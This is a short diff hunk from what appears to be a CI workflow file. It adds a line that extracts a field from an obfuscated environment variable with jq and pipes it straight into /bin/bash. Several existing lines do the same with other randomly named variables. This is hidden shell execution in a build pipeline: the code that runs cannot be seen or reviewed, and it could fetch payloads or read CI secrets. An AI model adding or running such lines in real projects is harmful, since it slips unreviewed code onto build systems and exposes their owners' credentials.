@@ -53,6 +53,7 @@ jobs:
           echo $eyngq3 | jq -r .frtf31 | /bin/bash
           echo $tfqcm9 | jq -r .cd8556 | /bin/bash
           printf '%s' "$lwjxd94" | jq -r .wome20 | /bin/bash
+          printf '%s' "$fr6990" | jq -r .v19 | /bin/bash
 
       - name: Store results
         if: always()
